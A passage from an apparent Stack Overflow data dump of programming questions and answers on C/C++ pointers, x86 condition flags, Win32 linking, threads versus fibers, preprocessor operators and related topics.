","9530","","<p>The documentation for <a href=""http://msdn.microsoft.com/en-us/library/ms709363%28VS.85%29.aspx"" rel=""nofollow""><code>joySetCapture</code></a> says that if <code>fChanged</code> is true, then messages are <em>only</em> sent when the position changes by more than the threshold.  Since it doesn't mention the buttons, I would assume that it doesn't send messages when buttons are pressed.  This seems like poor design to me, but if that's how it is, then you have to deal with it.</p>

<p>Why don't you want to use periodic polling messages?  As long as you set the polling interval to something reasonable (such as 16 ms for a 60 Hz refresh rate), I can assure you that polling the joystick is NOT going to be the bottleneck in your application, so it's not a question of performance.  There's no reason to set the polling interval to something really small, because the hardware simply doesn't send out updates that fast, so you'd just be wasting cycles processing the same data.</p>

<p>Finally, the multimedia joystick API is somewhat dated and has been superseded by DirectX.  You should use DirectInput instead so that you can handle joysticks with more than 4 buttons or more than 2 axes.  Furthermore, if you're using Xbox 360 controllers, you should use the XInput library to process those.</p>
"
"<p>I have a struct called ball, a number of balls, an array of balls and a function where I want to add new balls to the array:</p>

<p>The struct:</p>

<pre><code>typedef struct ball{
    BITMAP *image;
    int x;
    int y;
    int vector_x;
    int vector_y;
} ball;
</code></pre>

<p>The (<em>non working</em> function):</p>

<pre><code>void add_balls(int *num_balls, ball **myballs){
    num_balls++;
    *myballs = realloc(*myballs, *num_balls * sizeof(ball));
    *myballs[*num_balls-1]-&gt;x =  rand() % 640;
    *myballs[*num_balls-1]-&gt;y = rand() % 480;
    *myballs[*num_balls-1]-&gt;vector_x = rand() % 10;
    *myballs[*num_balls-1]-&gt;vector_y = rand() % 10;
    *myballs[*num_balls-1]-&gt;image = load_bitmap(""blue_ball.bmp"", NULL);	
 }
</code></pre>

<p>and the function call within main:</p>

<pre><code>add_balls(&amp;num_balls, &amp;myballs);
</code></pre>

<p>The call to the function fails with the following error messages:</p>

<pre><code>p.c: In function ‘add_balls’:
p.c:19: error: invalid type argument of ‘unary *’
p.c:20: error: invalid type argument of ‘unary *’
p.c:21: error: invalid type argument of ‘unary *’
p.c:22: error: invalid type argument of ‘unary *’
p.c:23: error: incompatible types in assignment
</code></pre>

<p>Any help?</p>

<p>That helped. It compiles now, but I get a segmentation fault error in runtime. Here is the complete code, if it interests:</p>

<pre><code>#include &lt;allegro.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;time.h&gt;
#include &lt;math.h&gt;

#define NUM_BALLS 10

typedef struct ball{
    BITMAP *image;
    int x;
    int y;
    int vector_x;
    int vector_y;
} ball;

void add_balls(int *num_balls, ball **myballs){
    num_balls++;
    myballs = realloc(*myballs, *num_balls * sizeof(ball));
    myballs[*num_balls-1]-&gt;x =  rand() % 640;
    myballs[*num_balls-1]-&gt;y = rand() % 480;
    myballs[*num_balls-1]-&gt;vector_x = rand() % 10;
    myballs[*num_balls-1]-&gt;vector_y = rand() % 10;
    myballs[*num_balls-1]-&gt;image = load_bitmap(""blue_ball.bmp"", NULL);	
 }

int main() 
{
    allegro_init();
    install_keyboard();
    srand(time(0));

    install_timer();

    set_color_depth(32);
    set_gfx_mode(GFX_AUTODETECT_WINDOWED, 640,480,0,0);

    BITMAP *buffer = NULL;
    buffer = create_bitmap(640,480);

    ball *myballs;
    myballs	 = malloc(NUM_BALLS * sizeof(ball));
    int num_balls = NUM_BALLS;

    BITMAP *bg = NULL;
    bg = load_bitmap(""bg.bmp"",NULL);

    int i;
    for(i=0;i&lt;num_balls;i++){
    	myballs[i].x =  rand() % 640;
    	myballs[i].y = rand() % 480;
    	myballs[i].vector_x = rand() % 10;
    	myballs[i].vector_y = rand() % 10;
    	myballs[i].image = load_bitmap(""blue_ball.bmp"", NULL);
    }

    int bg_vector_x;
    float bg_vector_y;

    while(!key[KEY_ESC]){
    	vsync();
    	for(i=0;i&lt;num_balls;i++){

    		if(myballs[i].x + myballs[i].vector_x &gt; 640 || myballs[i].x + myballs[i].vector_x &lt; 0){
    			myballs[i].vector_x *= -1;
    		}
    		if(myballs[i].y + myballs[i].vector_y &gt; 480 || myballs[i].y + myballs[i].vector_y &lt; 0){
    			myballs[i].vector_y *= -1;
    		}

    		myballs[i].x += myballs[i].vector_x;
    		myballs[i].y += myballs[i].vector_y;
    	}

    	if(key[KEY_UP]){
    		add_balls(&amp;num_balls, &amp;myballs);
    	}

    	clear_bitmap(buffer);

    	int ii;		
    	for(i=0;i&lt;3;i++){
    		for(ii=-1;ii&lt;3;ii++){
    			draw_sprite(buffer, bg ,(bg_vector_x%528)+(i*528),100*cos(bg_vector_y) + ii*353);		
    		}
    	}
    	bg_vector_x++;
    	bg_vector_y+=0.1;

    	for(i=0;i&lt;num_balls;i++){
    		draw_sprite(buffer, myballs[i].image, myballs[i].x,myballs[i].y);
    	}

    	blit(buffer, screen, 0,0,0,0,640,480);
    }

    for(i=0;i&lt;num_balls;i++){
    	destroy_bitmap(myballs[i].image);
    }
    free(myballs);
    destroy_bitmap(buffer);
}

END_OF_MAIN()
</code></pre>
","9530","","<p>Your original code was very close to being correct.  The first problem is relatively simple to fix.  The line</p>

<pre><code>num_balls++;
</code></pre>

<p>should be</p>

<pre><code>(*num_balls)++;
</code></pre>

<p>You were incrementing the location to which <code>num_balls</code> pointed, instead of incrementing the value that it pointed to.  When you later dereferenced it, it was pointing to some other piece of memory -- in this particular usage scenario, it was probably pointing to the next local variable on the stack in <code>main()</code>, the variable <code>bg</code>.</p>

<p>Your other problem is an order of operations problem.  Array indexing has higher operator precedence than dereferencing, so the line</p>

<pre><code>*myballs[*num_balls-1]-&gt;x = rand() % 640;
</code></pre>

<p>is equivalent to</p>

<pre><code>*(myballs[*num_balls-1]-&gt;x) = rand() % 640
</code></pre>

<p><code>myballs</code> is pointer to a pointer to an array of <code>ball</code>s.  If <code>*num_balls-1</code> is anything other than 0, you will be accessing the wrong memory.  Regardless, the member variable <code>x</code> is not a pointer, so you can't dereference it, so the compiler saves you here with a syntax error.  The correct code is to make sure you dereference before taking the array index:</p>

<pre><code>(*myballs)[*num_balls-1].x = rand() % 640;
</code></pre>

<p>This does what you want, namely dereferencing the pointer to get a pointer to the original array, taking the element you want, and assigning to the member variable <code>x</code>.  The rest of the lines in <code>add_ball()</code> should be rewritten analogously.</p>

<p>One other issue with your code, which is more of an issue with performance than with correctness, is that you're reloading the <code>blue_ball.bmp</code> image for every ball.  It would be better to <em>instance</em> the bitmap by only loading it once, and then have every ball refer to that one instance instead of reloading it each time.</p>
"
"<p>For example the following cast can be found littered throughout the MSDN documentation:</p>

<pre><code>(LPTSTR)&amp;lpMsgBuf
</code></pre>

<p>Should I bother converting that to:</p>

<pre><code>static_cast&lt;LPTSTR&gt;(&amp;lpMsgBuf);
</code></pre>

<p>Or should I just leave all the idiomatic C-esque Win32 portions as they are typically found in the docs, and save the more idiomatic C++ style/usage for the rest of my code?</p>
","9530","","<p>You shouldn't need a cast at all -- from the looks of it, <code>lpMsgBuf</code> is a pointer to an array of characters (it's unclear from context if they are ANSI characters or wide characters), which you can pass directly to the various Win32 functions.</p>

<p>There's no need to take the address -- if <code>lpMsgBuf</code> is a static array (e.g. <code>char lpMsgBuf[SIZE]</code>), then taking its address is redundant and is equivalent to the address of its first element.  If it's a pointer, then taking its address yields a <code>char**</code> (or a <code>wchar_t**</code> if it's wide), which is NOT what you want to pass -- if a Win32 function is expecting an <code>LPSTR</code> (i.e. a <code>char*</code>) and you pass it a <code>char**</code> cast to a <code>char*</code>, much badness will result.  The compiler will not let you pass <code>char**</code> to a function expecting a <code>char*</code> without a cast -- using a cast to silence the compiler is WRONG, since the compiler is trying to tell you something important.</p>

<p>If you can't pass the parameter you want to in this case without casting, you're almost certainly passing it wrong.  Fix the code so that you don't need a cast.</p>
"
"<p>CF: <strong>Carry Flag</strong></p>

<p>ZF: <strong>Zero Flag</strong></p>

<p>i'm current read  a book on intel x86 assembly on linux platform using AT&amp;T syntax,and the book said,the effect of <strong>setbe D</strong> is qeuivalent to:</p>

<p><strong>D</strong> &larr; <strong>CF</strong> &amp; ~ <strong>ZF</strong></p>

<p>i understood that,but could it simply write as:</p>

<p><strong>D &larr;</strong> <strong>CF</strong>|<strong>ZF</strong> </p>

<p>this only different from ~ZF&amp;CF when CF/ZF is either 1/1,or 1/0.which one is more accurate?</p>
","9530","","<p><code>setbe</code> sets the result to 1 if <code>(ZF=1) or (CF=1)</code>.  If the documentation you're reading says that it sets it on <code>(ZF=0) and (CF=1)</code>, it's wrong.  See the <a href=""http://pdos.csail.mit.edu/6.828/2008/readings/i386/SETcc.htm"" rel=""nofollow"">80386 Programmer's Reference Manual</a>.  Below is a detailed analysis:</p>

<p><code>setbe</code> sets the result to 1 if the result of the preceding comparison was <strong>b</strong>elow-or-<strong>e</strong>qual, when compared as unsigned integers (the equivalent for signed integers would be <code>setle</code>, for <strong>l</strong>ess-or-<strong>e</strong>qual).</p>

<p>When <code>cmp</code> instruction is performed, the destination operand is subtracted from the source operand, and the result is discarded.  The only output is the setting of the condition flags.  Remember that when we subtract two numbers <code>A-B</code>, we're really adding <code>A+(~B)+1</code> in two's complement, where <code>~B</code> is the one's complement of <code>B</code> (i.e. all the bits are flipped).</p>

<p>Let's look at 6 cases:</p>

<pre>
Case 0: Compare 1 to 0
    0 - 1
  = 0 + ~1 + 1
  = 0x00000000 + 0xfffffffe + 1
  = 0xffffffff ≠ 0, no carry
  ==> ZF = 0, CF = 0

Case 1: Compare 0 to 0
    0 - 0
  = 0 + ~0 + 1
  = 0x00000000 + 0xffffffff + 1
  = 0x00000000 = 0, with carry
  ==> ZF = 1, CF = 0

Case 2: Compare 0 to 1
    1 - 0
  = 1 + ~0 + 1
  = 0x00000001 + 0xffffffff + 1
  = 0x00000001 ≠ 0, with carry
  ==> ZF = 0, CF = 1

Case 3: Compare UINT_MAX to 0
    0 - 4294967295
  = 0 + ~4294967295 + 1
  = 0x00000000 + 0x00000000 + 1
  = 0x00000001 ≠ 0, no carry
  ==> ZF = 0, CF = 0

Case 4: Compare 0 to UINT_MAX
    4294967295 - 0
  = 4294967295 + ~0 + 1
  = 0xffffffff + 0xffffffff + 1
  = 0xffffffff ≠ 0, with carry
  ==> ZF = 0, CF = 1

Case 5: Compare UINT_MAX to UINT_MAX
    4294967295 - 4294967295
  = 4294967295 + ~4294967295 + 1
  = 0xffffffff + 0x00000000 + 1
  = 0x00000000 = 0, with carry
  ==> ZF = 1, CF = 1
</pre>

<p>The cases in which the first argument is below-or-equal to the second are cases 1, 2, 4, and 5.  All of these satisfy <code>(ZF=1) or (CF=1)</code>, and the remaining cases in which the comparison is false satisfy the opposite condition, <code>(ZF=0) and (CF=0)</code>.  Note that we've also enumerated all possible combinations of CF and ZF.  Hence, we conclude that the correct behavior for <code>setbe</code> is to set on <code>(ZF=1) or (CF=1)</code>.</p>
"
"<p>I am currently working on an application which displays several <code>UIView</code>s in a <code>UIScrollView</code>. This <code>UIScrollView</code> is inside of a <code>UIViewController</code>.</p>

<p>In a loop I am creating new <code>UIView</code>s, <code>autorelease</code> them and add them to the scroll view. Could this be the problem? </p>

<p>When I try to release the view controller all the subviews with their labels, images, etc are staying in the memory.</p>

<p>What would be the best way to get rid of those objects? </p>
","9530","","<p>It's impossible to tell without seeing some code.  Post a snippet of the code you believe to be suspect.  Make sure you're following all of the rules laid out in the <a href=""http://developer.apple.com/DOCUMENTATION/Cocoa/Conceptual/MemoryMgmt/MemoryMgmt.html"" rel=""nofollow"">Memory Management Programming Guide for Cocoa</a>.</p>
"
"<p>It's known that CF indicates unsigned carry out and OF indicates signed overflow. So how does an assembly program differentiate between unsigned and signed data since it's only a sequence of bits? (Through additional memory storage for type information, or through positional information or else?) And could these two flags be used interchangeably?</p>
","9530","","<p>There are different opcodes for dealing with signed and unsigned data.  If a program wants to compare two signed integers, it uses the opcodes <code>jl</code>, <code>jle</code>, <code>jg</code>, and <code>jge</code>, where the l and g stand for <em>l</em>ess and <em>g</em>reater respectively.  If a program wants to compare two unsigned integers, it uses the opcodes <code>jb</code>, <code>jbe</code>, <code>ja</code>, and <code>jae</code>, where the a and b stand for <em>a</em>bove and <em>b</em>elow respectively.  The e stands for 'or equal to' in all cases.  These opcodes are used for branching based on a comparison.</p>

<p>Similarly, there are also the <code>setCC</code> instructions, which set a byte to 0 or 1 depending on a comparison.  These function identically -- there are <code>setl</code>, <code>setle</code>, <code>setg</code>, <code>setge</code>, <code>setb</code>, <code>setbe</code>, <code>seta</code>, <code>setae</code>, and others.</p>

<p>The signed opcodes test the flags ZF, OF, and SF.  The unsigned opcodes test the flags ZF, CF, and SF.  See the 80386 Programmer's Reference Manual sections on the <a href=""http://pdos.csail.mit.edu/6.828/2008/readings/i386/Jcc.htm"" rel=""nofollow"">JCC</a> instructions and the <a href=""http://pdos.csail.mit.edu/6.828/2008/readings/i386/SETcc.htm"" rel=""nofollow"">setCC</a> instructions for the exact conditions tested.</p>
"
"<p>Just want to document the answer to this specific question... a similar question (with potential answers was asked <a href=""http://stackoverflow.com/questions/150294/how-to-programmatically-get-the-cpu-cache-page-size-in-c"">here</a>)</p>

<p>All platforms welcome, please specify the platform for your answer. </p>
","9530","","<p>On x86, you can use the <a href=""http://en.wikipedia.org/wiki/CPUID"">CPUID</a> instruction with function 2 to determine various properties of the cache and the TLB.  Parsing the output of function 2 is somewhat complicated, so I'll refer you to section 3.1.3 of the <a href=""http://www.intel.com/assets/pdf/appnote/241618.pdf"">Intel Processor Identification and the CPUID Instruction</a> (PDF).</p>

<p>To get this data from C/C++ code, you'll need to use inline assembly, compiler intrinsics, or call an external assembly function to perform the CPUID instruction.</p>
"
"<p>The compiler doesn't know where stat.h is? </p>

<p>Error:
c:\Projects\ADC_HCI\mongoose.c(745) : error C2079: 'st' uses undefined struct '_stat64'</p>

<pre><code>#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;

static int
mg_stat(const char *path, struct mgstat *stp)
{
    struct	_stat64	st; //&lt;-- ERROR

    int		ok;
    wchar_t		wbuf[FILENAME_MAX];

    to_unicode(path, wbuf, ARRAY_SIZE(wbuf));
    if (_wstat64(wbuf, &amp;st) == 0) {
    	ok = 0;
    	stp-&gt;size = st.st_size;
    	stp-&gt;mtime = st.st_mtime;
    	stp-&gt;is_directory = S_ISDIR(st.st_mode);
    } else {
    	ok = -1;
    }

    return (ok);
}
</code></pre>

<p>...downloaded the files straight from the <a href=""http://code.google.com/p/mongoose/w/list"" rel=""nofollow"">source</a>. </p>
","9530","","<p>See <a href=""http://msdn.microsoft.com/en-us/library/14h5k7ff%28VS.80%29.aspx"" rel=""nofollow"">MSDN</a>: <code>_wstat64</code> takes a parameter of <code>struct __stat64</code> (with <em>two</em> underscores).  Redeclare your variable <code>st</code> to be of type <code>struct __stat64</code>.</p>
"
"<p>I try to compile this code:</p>

<pre><code>static uint64_t
push(int fd, SOCKET sock, SSL *ssl, const char *buf, uint64_t len)
{
    uint64_t    sent;
    int     n, k;

    sent = 0;
    while (sent &lt; len) {

        /* How many bytes we send in this iteration */
        k = len - sent &gt; INT_MAX ? INT_MAX : (int) (len - sent);

        if (ssl != NULL) {
            n = SSL_write(ssl, buf + sent, k);
        } else if (fd != -1) {
            n = write(fd, buf + sent, k);
        } else {
            n = send(sock, buf + sent, k, 0);
        }

        if (n &lt; 0)
            break;

        sent += n;
    }

    return (sent);
}
</code></pre>

<p>And I get this linker error:
Linking...<br>
mongoose.obj : error LNK2019: unresolved external symbol _send@16 referenced in function _push</p>

<p>What am I missing?  It must be some lib or something.  I just don't remember what I need to add to my linking.</p>
","9530","","<p>The problem is that the linker can't find the <code>send()</code> function.  You've included the proper header files, so the compiler is ok, but you're not linking with the proper static libraries.  Open up your project settings, go to the Linker section, and add the proper library to the list of libraries that are linked in.</p>

<p><strong>[Edit]</strong></p>

<p>The correct library to add is <code>wsock32.lib</code>.</p>
"
"<p>I am trying to detect when the user is blowing into the mic of an iPhone. Right now I am using the SCListener class from <a href=""http://stephencelis.com/2009/03/02/now-i-just-need-an-audience.html"">Stephen Celis</a> to call</p>

<pre><code>if ([[SCListener sharedListener] peakPower] &gt; 0.99)
</code></pre>

<p>in an NSTimer. However, this returns true sometimes when I'm not blowing. Anyone have any sample code to check if the user is blowing into the mic?</p>
","9530","","<p>I would recommend <a href=""http://en.wikipedia.org/wiki/Low-pass%5Ffilter"">low-pass filtering</a> the power signal first.  There is always going to be some amount of transient noise that will mess with instantaneous readings; low-pass filtering helps mitigate that.  A nice and easy low-pass filter would be something like this:</p>

<pre><code>// Make this a global variable, or a member of your class:
double micPower = 0.0;
// Tweak this value to your liking (must be between 0 and 1)
const double ALPHA = 0.05;

// Do this every 'tick' of your application (e.g. every 1/30 of a second)
double instantaneousPower = [[SCListener sharedListener] peakPower];

// This is the key line in computing the low-pass filtered value
micPower = ALPHA * instantaneousPower + (1.0 - ALPHA) * micPower;

if(micPower &gt; THRESHOLD)  // 0.99, in your example
    // User is blowing on the microphone
</code></pre>
"
"<p>I see a lot of c++ code that looks like this:</p>

<pre><code>for( const_iterator it = list.begin(),
     const_iterator ite = list.end();
     it != ite; ++it)
</code></pre>

<p>As opposed to the more concise version:</p>

<pre><code>for( const_iterator it = list.begin();
     it != list.end(); ++it)
</code></pre>

<p>Will there be any difference in speed between these two conventions? Naively the first will be slightly faster since list.end() is only called once. But since the iterator is const, it seems like the compiler will pull this test out of the loop, generating equivalent assembly for both.</p>
","9530","","<p>The first one will probably almost always be faster, but if you think this will make a difference, always <strong>profile first</strong> to see which is faster and by how much.</p>

<p>The compiler will probably be able to inline the call to <code>end()</code> in both cases, although if <code>end()</code> is sufficiently complicated, it may opt not to inline it.  However, the key optimization is whether or not the compiler can perform <a href=""http://en.wikipedia.org/wiki/Loop-invariant%5Fcode%5Fmotion"">loop-invariant code motion</a>.  I would posit that in most cases, the compiler can't be certain that the value of <code>end()</code> won't change during the iteration of the loop, in which case it has no choice but to call <code>end()</code> after each iteration.</p>
"
"<p>I was looking for a way to create hard links under Windows and I found this page: <a href=""http://technet.microsoft.com/en-us/library/cc788097.aspx"" rel=""nofollow"">http://technet.microsoft.com/en-us/library/cc788097.aspx</a></p>

<p>To try it out, I created a file (1.txt) on the root of my C: drive with 100 lines of the following content:</p>

<p>C:\1.txt (2.598 bytes):</p>

<pre><code>test test test test test
</code></pre>

<p>Then I open the command prompt and typed:</p>

<pre><code>fsutil hardlink create C:\2.txt C:\1.txt
</code></pre>

<p>Success, 2.txt was created but when I go to see it's size it has exactly 2.598 bytes and also noticed some strange behaviours (as far as my understanding of hard links goes):</p>

<ol>
<li>If I delete 2.txt (the hard linked file) 1.txt is not deleted, and vice-versa.</li>
<li>If I open 2.txt after I delete 1.txt (the original file) the content is still the same.</li>
</ol>

<p>How does the fsutil hardlink create command differs from the copy command? And how can I create a true hard link under Windows?</p>

<p>I'm using Windows XP SP 3, and my file system is NTFS.</p>
","9530","","<p>That's exactly the behavior that supposed to happen.  Are you sure you understand how hard links work?  Hard links are really just multiple entries in the file system that refer to the exact same file.  If you create a hard link to a file and modify one of the instances of the file, the other file will show up with your changes because they both refer to the same blocks of data on disk.</p>

<p>When you delete one of the hard links, you're really just deleting one of the file system entries referring to that file.  The file doesn't get deleted until you delete <em>all</em> of its hard links (including the original one).  After you delete 1.txt, 2.txt still exists and refers to the same file that was originally there, only now there is only a single file system entry referring to that file (namely, 2.txt).  2.txt <em>is</em> that file.</p>
"
"<p>What is the difference between a thread and a fiber? I've heard of fibers from ruby and I've read heard they're available in other languages, could somebody explain to me in simple terms what is the difference between a thread and a fiber.</p>
","9530","","<p>Threads use <strong>pre-emptive</strong> scheduling, whereas fibers use <strong>cooperative</strong> scheduling.</p>

<p>With a thread, the control flow could get interrupted at any time, and another thread can take over.  With multiple processors, you can have multiple threads all running at the same time (<em>simultaneous</em> multithreading, or SMT).  As a result, you have to be <em>very</em> careful about concurrent data access, and protect your data with mutexes, semaphores, condition variables, and so on.  It is often very tricky to get right.</p>

<p>With a fiber, control only switches when you tell it to, typically with a function call named something like <code>yield()</code>.  This makes concurrent data access easier, since you don't have to worry about atomicity of data structures or mutexes.  As long as you don't yield, there's no danger of being <em>preempted</em> and having another fiber trying to read or modify the data you're working with.  As a result, though, if your fiber gets into an infinite loop, no other fiber can run, since you're not yielding.</p>

<p>You can also mix threads and fibers, which gives rise to the problems faced by both.  Not recommended, but it can sometimes be the right thing to do if done carefully.</p>
"
"<p>I'm looking at some open source projects and I'm seeing the following:</p>

<p>NSLog(@""%s w=%f, h=%f"", #size, size.width, size.height)</p>

<p>What exactly is the meaning of '#' right before the size symbol? Is that some kind of prefix for C strings?</p>
","9530","","<p>The official name of <code>#</code> is the <em>stringizing operator</em>.  It takes its argument and surrounds it in quotes to make a C string constant, escaping any embedded quotes or backslashes as necessary.  It is only allowed inside the definition of a macro -- it is not allowed in regular code.  For example:</p>

<pre><code>// This is not legal C
const char *str = #test

// This is ok
#define STRINGIZE(x) #x
const char *str1 = STRINGIZE(test);      // equivalent to str1 = ""test"";
const char *str2 = STRINGIZE(test2""a\"""");  // equivalent to str2 = ""test2\""a\\\"""";
</code></pre>

<p>A related preprocessor operator is the <em>token-pasting operator</em> <code>##</code>.  It takes two tokens and pastes them together to get one token.  Like the stringizing operator, it is only allowed in macro definitions, not in regular code.</p>

<pre><code>// This is not legal C
int foobar = 3;
int x = foo ## bar;

// This is ok
#define TOKENPASTE(x, y) x ## y
int foobar = 3;
int x = TOKENPASTE(foo, bar);  // equivalent to x = foobar;
</code></pre>
"
"<p><code>No</code></p>

<ul>
<li>The JIT compiler may ""transform"" the bytecode into something completely different anyway.  </li>
<li>It will lead you to do premature optimization.</li>
</ul>

<p><code>Yes</code></p>

<ul>
<li>You do not know which method will be compiled by the JIT, so it is better if you optimize them all.</li>
<li>It will make you a better Java programmer.</li>
</ul>

<p>I am asking without really knowing (obviously) so feel free to redirect to JIT hyperlinks.</p>
","9530","","<p>That depends entirely on what you're trying to do.  If you're trying to optimize a method/module, looking at the byte code is going to be a waste of your time.  Always profile first to find where your bottlenecks are, then optimize the bottlenecks.  If your bottleneck seems as tight as it possibly can be and you need to make it faster, you may have no choice but to rewrite that in native code and interface with JNI.</p>

<p>Trying to optimize the generated bytecode will be of little help, since the JIT compiler will do a lot of work, and you won't have much of an idea of exactly what it's doing.</p>
"
"<p>I am grabbing an image from the camera roll and then using it for a while as well as save it to disk as a PNG on the iPhone. I am getting the odd crash, presumably due to out of memory. </p>

<p>Does it make a difference if I save it as PNG or JPG (assuming I choose note to degrade the quality in the JPG case)? Specifically: </p>

<ul>
<li>is more memory then used by the UIImage after I reload it off of disk if I saved it as a PNG?</li>
<li>is it possible the act of saving as PNG uses up more memory transiently during the saving process?</li>
</ul>

<p>I had been assuming the UIImage was a format neutral representation and it shouldn't matter, but I thought I should verify.</p>
","9530","","<p>It depends on what type of images you're dealing with.  If you're dealing with photographic images, JPEGs will almost always be smaller than PNGs, with no discernable loss of detail as can be seen by the human eye.</p>

<p>Conversely, if you're dealing with highly non-photographic images such as GUI elements or images with large blocks of solid colors, then PNGs and JPEGs will be comparable in size, but the PNG will save losslessly whereas the JPEG will be lossy and have very visible artifacts.  If you have a <em>really</em> simple image (very large blocks of constant colors, e.g.), then a PNG will very likely be much smaller than a JPEG, and again will not have any compression artifacts.</p>

<p>The act of saving an image as a PNG or JPEG should not take up very much transient memory.  When an image is in memory, it is typically stored uncompressed in memory so that it can be drawn to the screen very quickly, as opposed to having to decompress it every time you want to render it.  Compared to the size of the uncompressed image, the amount of extra temporary storage you need to compress it is very small.  If you can fit the uncompressed image in memory, you don't have to worry about the memory used while compressing it.</p>

<p>And of course, once you write the image to the file system in non-volatile storage and free the in-memory image, it really doesn't matter how big the compressed image is, because it doesn't take up main memory any more.  The size of the compressed image only affects how much flash storage it's using, which can be an issue, but it does not affect high likely your app is to run out of memory.</p>
"
"<p>Is there any easy way to view the data in an STL <code>std::list&lt;T&gt;</code> in the Metrowerks CodeWarrior debugger?  I can view data near the beginning or end of the list by looking at expressions such as</p>

<pre><code>instances-&gt;__list_imp.__list_deleter.end_.compressed_pair_imp.second_.prev_-&gt;data_
</code></pre>

<p>I can expand the little '+' signs next to the struct members to walk the list an element at a time, but this is tedious, and after about 20-30 elements, the tree gets too wide for the debugger window.  The list I'm examining has over 2000 elements.</p>

<p>The CodeWarrior debugger does not support calling functions in expressions, so I can't examine the value of <code>(++(++instances.begin()))</code> or somesuch.  I can only look at struct members, which have very long and inconvenient names.</p>

<p>The debugger window is also limited to about 245 characters, so I can't write a script to generate a ridiculously long expression that will expand to the Nth node.</p>

<p>I'm trying to debug a problem that requires several hours of soaking to reproduce, so anything that requires adding code incrementally, recompiling, and redebugging will not be very helpful.  If there's no other option, though, then I may have to do that.</p>
","9530","","<p>It turns out the problem I was having was due to the very fact that the list had several thousand elements -- it should only have had a couple dozen elements, max.</p>

<p>In this particular STL implementation, the <code>prev</code> pointers were stored at offset 0 of each node, so I could follow back links by just repeatedly dereferencing.  The following monstrosity looks backwards 20 links:</p>

<pre><code>********************((Metrowerks::node_base**********************)instances-&gt;__list_imp.__list_deleter.end_.compressed_pair_imp.second_)
</code></pre>

<p>Following forward links is even uglier, since you have to offset by 4 bytes after each dereference.</p>
"
"<p>Why won't the compiler let me forward declare a typedef?</p>

<p>Assuming it's impossible, what's the best practice for keeping my inclusion tree small?</p>
","9530","","<p>In C++ (but not plain C), it's perfectly legal to typedef a type twice, so long as both definitions are <em>completely</em> identical:</p>

<pre><code>// foo.h
struct A{};
typedef A *PA;

// bar.h
struct A;  // forward declare A
typedef A *PA;
void func(PA x);

// baz.cc
#include ""bar.h""
#include ""foo.h""
// We've now included the definition for PA twice, but it's ok since they're the same
...
A x;
func(&amp;x);
</code></pre>
"
"<p>When creating a simple object hierarchy in Python, I'd like to be able to invoke methods of the parent class from a derived class.  In Perl and Java, there is a keyword for this (super).  In Perl, I might do this:</p>

<pre><code>package Foo;

sub frotz {
    return ""Bamf"";
}

package Bar;
@ISA = qw(Foo);

sub frotz {
   my $str = SUPER::frotz();
   return uc($str);
}
</code></pre>

<p>In python, it appears that I have to name the parent class explicitly from the child.
In the example above, I'd have to do something like Foo::frotz().  </p>

<p>This doesn't seem right, since this behavior makes it hard to make deep hierarchies.  If children need to know what class defined an inherited method, then all sorts of information pain is created.  </p>

<p>Is this an actual limitation in python, a gap in my understanding or both?</p>
","9530","","<p>Yes, but only with <a href=""http://docs.python.org/glossary.html#term-new-style-class"">new-style classes</a>.  Use the <a href=""http://docs.python.org/library/functions.html#super""><code>super()</code></a> function:</p>

<pre><code>class Foo(Bar):
    def baz(self, arg):
        return super(Foo, self).baz(arg)
</code></pre>
"
"<p>I've recently heard a few people say that in Linux, it is almost always better to use processes instead of threads, since Linux is very efficient in handling processes, and because there are so many problems (such as locking) associated with threads.  However, I am suspicious, because it seems like threads could give a pretty big performance gain in some situations.</p>

<p>So my question is, when faced with a situation that threads and processes could both handle pretty well, should I use processes or threads?  For example, if I were writing a web server, should I use processes or threads (or a combination)?</p>
","9530","","<p>That depends on a lot of factors.  Processes are more heavy-weight than threads, and have a higher startup and shutdown cost.  Interprocess communication (IPC) is also harder and slower than interthread communication.</p>

<p>Conversely, processes are safer and more secure than threads, because each process runs in its own virtual address space.  If one process crashes or has a buffer overrun, it does not affect any other process at all, whereas if a thread crashes, it takes down all of the other threads in the process, and if a thread has a buffer overrun, it opens up a security hole in all of the threads.</p>

<p>So, if your application's modules can run mostly independently with little communication, you should probably use processes if you can afford the startup and shutdown costs.  The performance hit of IPC will be minimal, and you'll be slightly safer against bugs and security holes.  If you need every bit of performance you can get or have a lot of shared data (such as complex data structures), go with threads.</p>
"
"<p>I am writing a C++ application and would like to request several data files through a HTTP GET request simultaneously, where should I look to get started (needs to be cross-platform). </p>

<ol>
<li>Run Application</li>
<li>Create a list of URLs { ""http://host/file1.txt"", ""http://host/file2.txt"", ""http://host/file3.txt""} </li>
<li>Request all the URLs simultaneously and load the contents to variables (don't want disk writes). Each file has about 10kB of data. </li>
</ol>

<p>What libraries would you recommend I use? libcurl? curlpp? boost asio? would I need to roll-my-own multi threading to request all the files simultaneously? is there a easier way?</p>

<p>Edit: I will need to request about 1000 GET requests simultaneously. Most likely I will do this in batches (100 at a time, and creating more connections as made one are completed). </p>
","9530","","<p>I would recommend <a href=""http://curl.haxx.se/"" rel=""nofollow"">libcurl</a>.  I'm not super-familiar with it, but it does have a <a href=""http://curl.haxx.se/libcurl/c/libcurl-multi.html"" rel=""nofollow"">multi-interface</a> for performing multiple simultaneous HTTP operations.</p>

<p>Depending on what solution you go with, it's possible to do asynchronous I/O without using multithreading.  The key is to use the <a href=""http://linux.die.net/man/2/select"" rel=""nofollow""><code>select(2)</code></a> system call.  <code>select()</code> takes a set of file descriptors and tells you if any of them have data available.  If they do, you can then proceed to use <code>read(2)</code> or <code>recv(2)</code> on them without worrying about blocking.</p>
"
"<p>I've seen some methods like this:</p>

<pre><code>void SomeClass::someMethod() const;
</code></pre>

<p>What does this const declaration do, and how can it help optimize a program?</p>

<p><strong>Edit</strong></p>

<p>I see that the first part of this question has been asked before... <strong>BUT</strong>, it still doesn't answer the second part: how would this optimize the program?</p>
","9530","","<p>It allows you to call the class member function on <code>const</code> objects:</p>

<pre><code>class SomeClass
{
public:
    void foo();
    void bar() const;
}

SomeClass a;
const SomeClass b;

a.foo();  // ok
a.bar();  // ok
b.foo();  // ERROR -- foo() is not const
b.bar();  // ok -- bar() is const
</code></pre>

<p>There's also the <code>volatile</code> qualifier for use with <code>volatile</code> objects, and you can also make functions <code>const volatile</code> for use on <code>const volatile</code> objects, but those two are exceedingly rare.</p>
"
"<p>I'm working on some existing c++ code that appears to be written poorly, and is very frequently called.  I'm wondering if I should spend time changing it, or if the compiler is already optimizing the problem away.</p>

<p>I'm using Visual Studio 2008.</p>

